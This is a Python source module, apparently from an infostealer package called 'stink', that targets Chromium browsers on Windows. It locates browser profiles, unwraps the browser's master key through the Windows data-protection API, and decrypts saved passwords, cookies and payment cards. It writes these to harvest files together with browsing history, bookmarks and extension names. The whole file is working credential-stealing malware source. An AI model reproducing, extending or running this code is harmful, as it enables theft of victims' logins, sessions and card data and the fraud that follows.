from re import compile
from sqlite3 import connect
from shutil import copyfile
from base64 import b64decode
from json import load, loads, dump
from datetime import datetime, timedelta
from os import path, makedirs, remove, listdir
from ctypes import windll, byref, cdll, c_buffer
from distutils.dir_util import copy_tree, remove_tree

from stink.helpers import DataBlob
from stink.enums.features import Features
from stink.utils import AESModeOfOperationGCM
from stink.helpers.config import ChromiumConfig


class Chromium:

    def __init__(self, browser_name: str, storage_path: str, state_path: str, browser_path: str, statuses: list, errors: bool):

        self.__browser_name = browser_name
        self.__storage_path = storage_path
        self.__state_path = state_path
        self.__browser_path = browser_path
        self.__statuses = statuses
        self.__profiles = None
        self.__errors = errors

        self.__config = ChromiumConfig()
        self.__path = rf"{self.__storage_path}\Browsers\{self.__browser_name}"

    def _get_profiles(self):

        if self.__browser_path[-9:] in ["User Data"]:

            pattern = compile(r"Default|Profile \d+")
            return [rf"{self.__browser_path}\{profile}" for profile in sum([pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], [])]

        return [self.__browser_path]

    def _check_paths(self):

        if path.exists(self.__browser_path) and any(self.__statuses):

            makedirs(rf"{self.__storage_path}\Browsers\{self.__browser_name}")
            self.__profiles = self._get_profiles()

    @staticmethod
    def _crypt_unprotect_data(encrypted_bytes: b64decode, entropy=b''):

        blob = DataBlob()

        if windll.crypt32.CryptUnprotectData(byref(DataBlob(len(encrypted_bytes), c_buffer(encrypted_bytes, len(encrypted_bytes)))), None, byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))), None, None, 0x01, byref(blob)):

            buffer = c_buffer(int(blob.cbData))
            cdll.msvcrt.memcpy(buffer, blob.pbData, int(blob.cbData))
            windll.kernel32.LocalFree(blob.pbData)

            return buffer.raw

    def _get_key(self):

        with open(self.__state_path, "r", encoding="utf-8") as state:
            file = state.read()

        state.close()

        return self._crypt_unprotect_data(b64decode(loads(file)["os_crypt"]["encrypted_key"])[5:])

    @staticmethod
    def _get_datetime(date):

        try:
            return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
        except:
            return "Can't decode"

    @staticmethod
    def _decrypt(value: bytes, master_key: bytes = None):

        try:
            return AESModeOfOperationGCM(master_key, value[3:15]).decrypt(value[15:])[:-16].decode()
        except:
            return "Can't decode"

    def _write_passwords(self, *args):

        passwords_list = args[1].execute(self.__config.PasswordsSQL).fetchall()

        if not passwords_list:
            return

        data = self.__config.PasswordsData
        temp = [
            data.format(result[0], result[1], self._decrypt(result[2], args[2]))
            for result in passwords_list
        ]

        with open(rf"{self.__path}\{args[0]} Passwords.txt", "a", encoding="utf-8") as passwords:
            passwords.write("".join(item for item in set(temp)))

        passwords.close()

    def _write_cookies(self, *args):

        cookies_list = args[1].execute(self.__config.CookiesSQL).fetchall()

        if not cookies_list:
            return

        results = [
            {
                "creation_utc": result[0],
                "top_frame_site_key": result[1],
                "host_key": result[2],
                "name": result[3],
                "value": result[4],
                "encrypted_value": self._decrypt(result[5], args[2]),
                "path": result[6],
                "expires_utc": result[7],
                "is_secure": result[8],
                "is_httponly": result[9],
                "last_access_utc": result[10],
                "has_expires": result[11],
                "is_persistent": result[12],
                "priority": result[13],
                "samesite": result[14],
                "source_scheme": result[15],
                "source_port": result[16],
                "is_same_party": result[17],
            }
            for result in cookies_list
        ]

        with open(rf"{self.__path}\{args[0]} Cookies.json", "a", encoding="utf-8") as cookies:
            dump(results, cookies)

        cookies.close()

    def _write_cards(self, *args):

        cards_list = args[1].execute(self.__config.CardsSQL).fetchall()

        if not cards_list:
            return

        data = self.__config.CardsData
        temp = [
            data.format(result[0], self._decrypt(result[3], args[2]), result[1], result[2])
            for result in cards_list
        ]

        with open(rf"{self.__path}\{args[0]} Cards.txt", "a", encoding="utf-8") as cards:
            cards.write("".join(item for item in set(temp)))

        cards.close()

    def _write_history(self, *args):

        results = args[1].execute(self.__config.HistorySQL).fetchall()

        if not results:
            return

        history_list = (args[1].execute(self.__config.HistoryLinksSQL % int(item[0])).fetchone() for item in results)

        data = self.__config.HistoryData
        temp = [
            data.format(result[0], result[1], self._get_datetime(result[2]))
            for result in history_list
        ]

        with open(rf"{self.__path}\{args[0]} History.txt", "a", encoding="utf-8") as history:
            history.write("".join(item for item in set(temp)))

        history.close()

    def _write_bookmarks(self, *args):

        bookmarks_list = sum([self.__config.BookmarksRegex.findall(item) for item in args[1].split("{")], [])

        if not bookmarks_list:
            return

        data = self.__config.BookmarksData
        temp = [
            data.format(result[0], result[1])
            for result in bookmarks_list
        ]

        with open(rf"{self.__path}\{args[0]} Bookmarks.txt", "a", encoding="utf-8") as bookmarks:
            bookmarks.write("".join(item for item in set(temp)))

        bookmarks.close()

    def _write_extensions(self, *args):

        extensions_list = []
        extensions_dirs = listdir(args[1])

        if len(extensions_dirs) == 0:
            return

        for dirpath in extensions_dirs:

            extension_dir = listdir(fr"{args[1]}\{dirpath}")

            if len(extension_dir) == 0:
                continue

            extension_dir = extension_dir[-1]
            manifest_path = fr"{args[1]}\{dirpath}\{extension_dir}\manifest.json"

            with open(manifest_path, "r", encoding="utf-8") as file:
                manifest = load(file)
                name = manifest.get("name")

                if name:
                    extensions_list.append(name)

            file.close()

        with open(rf"{self.__path}\{args[0]} Extensions.txt", "a", encoding="utf-8") as extensions:
            extensions.write("\n".join(item for item in set(extensions_list)))

        extensions.close()

    def _copy_file(self, item, file_path):

        if path.exists(item["path"]):
            copyfile(item["path"], file_path)

        elif item["alt_path"] and path.exists(item["alt_path"]):
            copyfile(item["alt_path"], file_path)

        else:
            if self.__errors is True: print(f'[{self.__browser_name}]: {item["error"]}')
            return False

        return True

    def _copy_folder(self, item, folder_path):

        if path.exists(item["path"]):
            copy_tree(item["path"], folder_path)

        elif item["alt_path"] and path.exists(item["alt_path"]):
            copy_tree(item["alt_path"], folder_path)

        else:
            if self.__errors is True: print(f'[{self.__browser_name}]: {item["error"]}')
            return False

        return True

    def _process_profile(self, profile):

        profile_name = profile.replace("\\", "/").split("/")[-1]
        functions = [
            {
                "status": True if Features.passwords in self.__statuses else False,
                "name": "Passwords",
                "path": rf"{profile}\Login Data",
                "alt_path": None,
                "method": self._write_passwords,
                "file_type": ".db",
                "error": "No passwords found"
            },
            {
                "status": True if Features.cookies in self.__statuses else False,
                "name": "Cookies",
                "path": rf"{profile}\Cookies",
                "alt_path": rf"{profile}\Network\Cookies",
                "method": self._write_cookies,
                "file_type": ".db",
                "error": "No cookies found"
            },
            {
                "status": True if Features.cards in self.__statuses else False,
                "name": "Cards",
                "path": rf"{profile}\Web Data",
                "alt_path": None,
                "method": self._write_cards,
                "file_type": ".db",
                "error": "No cards found"
            },
            {
                "status": True if Features.history in self.__statuses else False,
                "name": "History",
                "path": rf"{profile}\History",
                "alt_path": None,
                "method": self._write_history,
                "file_type": ".db",
                "error": "No history found"
            },
            {
                "status": True if Features.bookmarks in self.__statuses else False,
                "name": "Bookmarks",
                "path": rf"{profile}\Bookmarks",
                "alt_path": None,
                "method": self._write_bookmarks,
                "file_type": None,
                "error": "No bookmarks found"
            },
            {
                "status": True if Features.extensions in self.__statuses else False,
                "name": "Extensions",
                "path": rf"{profile}\Extensions",
                "alt_path": None,
                "method": self._write_extensions,
                "file_type": None,
                "error": "No extensions found"
            }
        ]

        for function in functions:

            try:

                if function["status"] is False:
                    continue

                if function["name"] in ["Passwords", "Cookies", "Cards", "History"]:

                    file_path = rf"{self.__storage_path}\{self.__browser_name} {profile_name} {function['name']}{function['file_type']}"

                    if not self._copy_file(function, file_path):
                        continue

                    with connect(file_path) as connection:
                        connection.text_factory = lambda text: text.decode(errors="ignore")
                        cursor = connection.cursor()

                        function["method"](profile_name, cursor, self._get_key())
                        cursor.close()

                    connection.close()
                    remove(file_path)

                elif function["name"] in ["Bookmarks"]:

                    file_path = rf"{self.__storage_path}\{self.__browser_name} {profile_name} {function['name']}"

                    if not self._copy_file(function, file_path):
                        continue

                    with open(file_path, "r", encoding="utf-8") as file:
                        function["method"](profile_name, file.read())

                    file.close()
                    remove(file_path)

                elif function["name"] in ["Extensions"]:

                    folder_path = rf"{self.__storage_path}\{self.__browser_name} {profile_name}"

                    if not self._copy_folder(function, folder_path):
                        continue

                    function["method"](profile_name, folder_path)

                    remove_tree(folder_path)

            except Exception as e:
                if self.__errors is True: print(f"[{self.__browser_name}]: {repr(e)}")

    def _check_profiles(self):

        if not self.__profiles:
            if self.__errors is True: print(f"[{self.__browser_name}]: No profiles found")
            return

        for profile in self.__profiles:
            self._process_profile(profile)

    def run(self):

        try:

            self._check_paths()
            self._check_profiles()

        except Exception as e:
            if self.__errors is True: print(f"[{self.__browser_name}]: {repr(e)}")
